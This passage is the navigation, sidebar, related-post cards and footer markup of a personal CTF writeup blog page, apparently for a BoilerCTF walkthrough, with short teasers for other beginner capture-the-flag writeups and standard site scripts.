fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=BoilerCTF+Walkthrough+-+Rami3l&u=%2Fposts%2FBoilerCTF-Writeup%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2FBoilerCTF-Writeup%2F&text=BoilerCTF+Walkthrough+-+Rami3l" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Paper-writeup/">Paper writeup</a><li><a href="/posts/Deathnote/">Deathnote Writeup</a><li><a href="/posts/NahamConCTF/">NahamCon 2022 CTF - challenge walkthrough</a><li><a href="/posts/TenderFoot/">TenderFoot:1 Writeup</a><li><a href="/posts/BoilerCTF-Writeup/">BoilerCTF Walkthrough</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">Command Injection</a> <a class="post-tag" href="/tags/enumeration/">Enumeration</a> <a class="post-tag" href="/tags/brainfuck/">Brainfuck</a> <a class="post-tag" href="/tags/bruteforce/">Bruteforce</a> <a class="post-tag" href="/tags/cms/">CMS</a> <a class="post-tag" href="/tags/ctfs/">ctfs</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/directory-enumeration/">Directory Enumeration</a> <a class="post-tag" href="/tags/dirsearch/">Dirsearch</a> <a class="post-tag" href="/tags/esoteric-languages/">Esoteric Languages</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/TenderFoot/"><div class="card-body"> <em class="small" data-ts="1651359600" data-df="ll" > May 1, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TenderFoot:1 Writeup</h3><div class="text-muted small"><p> Preface Hey there! This is my writeup for the Vulnhub machine TenderFoot, Its described by it’s author as “A very Easy Box for beginners”, and is recommended for folks new to Vulnhub like myself. ...</p></div></div></a></div><div class="card"> <a href="/posts/PickleRick-Writeup/"><div class="card-body"> <em class="small" data-ts="1649631600" data-df="ll" > Apr 11, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pickle Rick Writeup</h3><div class="text-muted small"><p> Pickle Rick This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle. ...</p></div></div></a></div><div class="card"> <a href="/posts/Brooklyn99-Writeup/"><div class="card-body"> <em class="small" data-ts="1649631600" data-df="ll" > Apr 11, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Brookyln Nine Nine Writeup</h3><div class="text-muted small"><p> Brooklyn Nine Nine walkthrough. This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box, you can check it out here: Tryha...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/PickleRick-Writeup/" class="btn btn-outline-primary" prompt="Older"><p>Pickle Rick Writeup</p></a> <a href="/posts/NahamConCTF/" class="btn btn-outline-primary" prompt="Newer"><p>NahamCon 2022 CTF - challenge walkthrough</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/username">Johnson Daniel Olamide</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">Command Injection</a> <a class="post-tag" href="/tags/enumeration/">Enumeration</a> <a class="post-tag" href="/tags/brainfuck/">Brainfuck</a> <a class="post-tag" href="/tags/bruteforce/">Bruteforce</a> <a class="post-tag" href="/tags/cms/">CMS</a> <a class="post-tag" href="/tags/ctfs/">ctfs</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/directory-enumeration/">Directory Enumeration</a> <a class="post-tag" href="/tags/dirsearch/">Dirsearch</a> <a class="post-tag" href="/tags/esoteric-languages/">Esoteric Languages</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3"></p><button type="button" class="btn btn-primary" aria-label="Update"> </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
